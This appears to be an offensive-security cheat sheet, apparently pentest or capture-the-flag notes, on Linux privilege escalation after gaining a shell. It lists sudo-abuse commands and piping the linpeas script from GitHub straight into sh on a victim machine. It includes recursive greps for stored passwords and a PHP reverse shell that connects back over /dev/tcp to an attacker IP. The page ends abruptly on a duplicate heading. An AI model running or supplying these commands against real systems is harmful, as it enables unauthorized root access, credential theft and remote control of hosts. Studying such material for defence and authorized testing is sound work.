---
sort : 7
---


# Privilege Escalation

A type of network attack used to gain unauthorized access to systems within a security perimeter.

## Got A Shell ?? 

All we need to do is to become a root.

`Here are the most important attack vectors to perform :`

### 1. Knowing the compromised users permissions
```bash
$ whoami  

$ id 

$ uname -a
```

```bash
$ sudo -l 

User [Username] may run the following commands on [Machine Name]:
    (root) NOPASSWD: /home/user/personal/stuff/AnyScript.sh

# How to read this ?? 
# the current user `Username` can run the command `/home/Username/personal/stuff/AnyScript.sh` as a `root` without password

$ sudo -u root /home/user/personal/stuff/AnyScript.sh


=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


User [Username] may run the following commands on [Machine Name]:
    (Username2) NOPASSWD: /home/Username2/luvit
    
# the current user `Username` can run the command `/home/Username2/luvit` as a `Username2` without password


$ sudo -u Username2 /home/Username2/luvit privesc.lua    # some times the command needs args to work ^^ 


=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


User [Username] may run the following commands on [Machine Name]:
    (Username2 : Username2) NOPASSWD: ALL

# the current user `Username` can run `ANY` command as a `Username2` OR it's group without password


$ sudo -u Username2 /bin/bash

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

User [Username] may run the following commands on [Machine Name]:
    (ALL) NOPASSWD:/bin/nano /opt/priv


# the current user `Username` can run `/bin/nano /opt/priv` command as `ANY USER` without password

sudo -u Username /bin/nano /opt/priv   # not root ?? 
```

```bash
$ 
```




### 2. Privilege Escalation Tools

```bash 
# On Victime Machine 
$ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```




### 3. An Expedition Into System Files
search deeper in /var/www/

if i found multiple folders inside it ?? ==> this could indecte that the server is running multiple web apps !!! 

`inside /var` 
1. $ grep -roP 'passw.{0,30}'

```note	
grep will filter the files in each (non linked) folder recursivly. 
```

2. mostly as www-data user .... try to write a php reverse shell file in any writeable place to get a shell with privilaged user
    
    $ find . -writable -type d
    $ echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.8/1234 0>&1'\");" > shell.php  		# escape the double quotes inside a double qoutes ^^ to bypass the overlapping


3. AGAIN 
```bash
    $ grep -roP 'passw.{0,20}' 2>/dev/null
    then
    $ grep -rP 'passw.{0,10}' -B5 -A5 --exclude '*.min.js' 2>/dev/null
    $ grep -rP 'passw.{0,10}' -B5 -A5 --exclude '*.js' 2>/dev/null


    TRY : 
    $ grep -rP 'Web.{0,10}' -B5 -A5 2>/dev/null | awk 'length >= 1 && length <= 2000' | grep --color -P "Web|"	
```

### 1. Credential Exploitation